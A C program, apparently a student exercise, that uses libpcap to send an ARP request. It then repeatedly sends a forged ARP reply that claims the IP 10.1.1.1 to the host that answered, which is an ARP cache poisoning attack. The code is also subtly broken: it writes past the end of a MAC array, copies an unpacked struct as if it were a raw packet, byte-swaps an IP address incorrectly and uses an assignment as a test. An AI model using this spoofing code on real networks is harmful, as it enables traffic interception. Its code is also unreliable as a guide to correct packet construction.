#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <stdlib.h>

typedef struct {
	uint8_t des_mac[6];
	uint8_t src_mac[6];
	uint16_t type;

}arp_Ethernet;

typedef struct {
	uint8_t des_mac[6];
	uint8_t src_mac[6];
	uint16_t type;
	uint16_t hardware_type;
	uint16_t protocal_type;
	uint8_t hardware_size;
	uint8_t protocal_size;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint32_t sender_ip;
	uint8_t target_mac[6];
	uint32_t target_ip;
}arp_packet;

void usage() { 
    printf("syntax: pcap_test <interface>\n"); 
    printf("sample: pcap_test wlan0\n"); 
  } 

/*

void init_arp(arp_packet *arp_p){
	arp_p->hardware_type=1;
	arp_p->protocal_type=0x0800;
	arp_p->hardware_size=6;
	arp_p->protocal_size=4;	
}*/
void arp_request(arp_packet *arp_p){
	memset(arp_p->des_mac,0xFF,sizeof(uint8_t)*6);
	arp_p->src_mac[0]=0x08;
	arp_p->src_mac[1]=0x00;
	arp_p->src_mac[2]=0x27;
	arp_p->src_mac[3]=0xaa;
	arp_p->src_mac[4]=0xc7;
	arp_p->src_mac[5]=0xa2;
	arp_p->type=0x0608;
	arp_p->hardware_type=0x0100;
	arp_p->protocal_type=0x0008;
	arp_p->hardware_size=6;
	arp_p->protocal_size=4;
	arp_p->opcode =0x0100;
	memcpy(arp_p->sender_mac,arp_p->src_mac,sizeof(uint8_t)*6);
	arp_p->sender_ip = htonl(0x0a01010a);
	memset(arp_p->target_mac,0x00,sizeof(uint8_t)*6);
	arp_p->target_mac[6]=0x0a;
	arp_p->target_mac[7]=0x01;
	arp_p->target_ip = htons(0x01b8);
}


int main(int argc, char* argv[]) { 
    if (argc < 2) { 
      usage(); 
      return -1; 
    } 
  
    char* dev = argv[1]; 
    char errbuf[PCAP_ERRBUF_SIZE]; 
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
    if (handle == NULL) { 
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf); 
      return -1; 
    }
   u_char *packet;
    packet =(u_char*)malloc(42);
    arp_packet arp_p;
    arp_request(&arp_p);
   // init_arp(&arp_p);
    memcpy(packet,&arp_p,sizeof(u_char)*42);
   // printf("%s",packet);
    if(pcap_sendpacket(handle,packet,42)==-1){
	    printf("error");
    } else{
	    printf("success");

    }
    while(1){
	struct pcap_pkthdr * header;
	const u_char *acq_packet;
	int res = pcap_next_ex(handle,&header,&acq_packet);
	if(res =0) continue;
	if(res == -1 || res == -2) break;
	
	if(acq_packet[12]==0x8&&acq_packet[13]==0x06){
		if(acq_packet[20]==0x00 &&acq_packet[21]==0x02){
			memcpy(arp_p.des_mac,&acq_packet[22],sizeof(uint8_t)*6);
			memcpy(arp_p.target_mac,arp_p.des_mac,sizeof(uint8_t)*6);
			arp_p.opcode =htons(0x0002);
			arp_p.sender_ip = htonl(0x0a010101);
			
			break;	

		}
	}

    }

	memcpy(packet,&arp_p,sizeof(u_char)*42);
	int i =0;
send:   i=0;
	if(pcap_sendpacket(handle,packet,42)==-1){			
		printf("error");			
	}else{
		printf("sendd");
	}
	scanf("%d",&i);
	if(i==1)
		goto send;

}
